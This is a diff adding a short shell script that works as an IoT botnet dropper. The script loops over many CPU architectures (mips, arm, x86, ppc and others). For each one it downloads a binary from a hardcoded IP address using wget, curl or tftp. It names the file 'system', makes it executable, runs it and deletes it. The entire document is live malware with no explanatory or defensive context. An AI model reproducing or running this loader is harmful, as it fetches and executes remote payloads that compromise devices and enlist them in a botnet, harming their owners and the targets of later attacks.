@@ -1,0 +1,14 @@
+binarys="mips mpsl x86 arm arm5 arm6 arm7 i5 i6 sh4 ppc arc"
+server_ip="45.95.146.26"
+binout="system"
+
+rm -rf $binout
+
+for arch in $binarys
+do
+rm -rf $arch
+wget http://$server_ip/g/$arch -O $binout || curl -O $binout http://$server_ip/g/$arch || tftp -g -l $binout -r $arch $server_ip
+chmod 777 $binout
+./$binout $1
+rm -rf $binout
+done
